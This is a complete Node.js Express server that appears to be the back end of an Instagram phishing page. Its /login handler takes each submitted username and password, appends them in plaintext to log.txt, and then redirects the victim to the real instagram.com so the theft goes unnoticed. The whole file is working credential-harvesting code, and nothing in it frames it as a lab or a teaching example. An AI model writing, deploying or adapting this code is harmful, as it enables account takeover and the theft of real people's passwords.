const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: false }));

// Serve static files (like index.html)
app.use(express.static(path.join(__dirname, 'public')));

// Handle login POST request
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const logData = `Username: ${username} | Password: ${password}\n`;

  fs.appendFile('log.txt', logData, (err) => {
    if (err) {
      console.error('❌ Failed to write to log.txt', err);
    } else {
      console.log('✅ Logged credentials');
    }
  });

  // Redirect to real Instagram or show "Login Failed"
  res.redirect('https://instagram.com');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
